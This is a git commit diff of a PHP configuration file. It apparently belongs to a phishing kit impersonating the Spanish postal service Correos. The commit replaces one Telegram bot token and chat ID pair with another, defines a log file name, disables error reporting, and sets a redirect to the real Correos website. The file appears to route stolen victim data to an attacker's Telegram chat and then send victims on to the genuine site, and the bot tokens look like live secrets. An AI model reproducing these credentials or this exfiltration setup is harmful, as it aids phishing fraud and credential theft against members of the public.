a7c35da0f11b3d4f3b5c99a879c3b88f3eb81e02
lokashamada <119459399+lokashamada@users.noreply.github.com>
2022-11-30 00:58:43 +0100

    Update conf.php

--- settings/conf.php
+++ settings/conf.php
@@ -2,9 +2,9 @@
 
 error_reporting(0);
 
-define("TELEGRAM_TOKEN", "5544847494:AAEnhyodvVER8Tj09GJdirYv8pqdLEoNpwQ");
-define("TELEGRAM_CHAT_ID", "-819179036");
-define("TELEGRAM_CHAT_IDD", "-819179036");
+define("TELEGRAM_TOKEN", "5856755195:AAHlySNc4BZ80yzJbHpcRKJAYCYqaf5vegI");
+define("TELEGRAM_CHAT_ID", "-807760554");
+define("TELEGRAM_CHAT_IDD", "-807760554");
 define("TXT_FILE_NAME", 'mjinina.txt');
 define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
 
